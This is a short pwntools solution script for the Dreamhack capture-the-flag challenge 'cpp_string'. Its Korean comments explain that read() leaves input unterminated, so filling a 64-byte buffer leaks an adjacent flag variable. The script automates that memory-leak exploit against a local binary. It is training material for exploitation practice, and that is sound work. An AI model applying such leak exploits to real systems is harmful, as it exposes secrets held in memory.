'''
[Dreamhack] cpp_string
1. 취약점: read() 함수는 입력값 뒤에 널 문자를 보장하지 않기에 인접한 메모리의 값을 출력할 수 있음
2. 시나리오: 널 바이트가 없도록 입력한 뒤, 출력하여 인접한 flag 변수 값 출력
3. 페이로드 구조: [ 널 바이트가 없도록 입력을 최대로 넣는다. ]
'''

from pwn import *

p = process('./cpp_string')
# p = remote('IP', PORT)

#1 write file
p.sendlineafter(b'input : ', b'2')

payload = b'A' * 64
p.sendlineafter(b'Enter file contents : ', payload)

#2 read file
p.sendlineafter(b'input : ', b'1')

#3 show contents
p.sendlineafter(b'input : ', b'3')

p.interactive()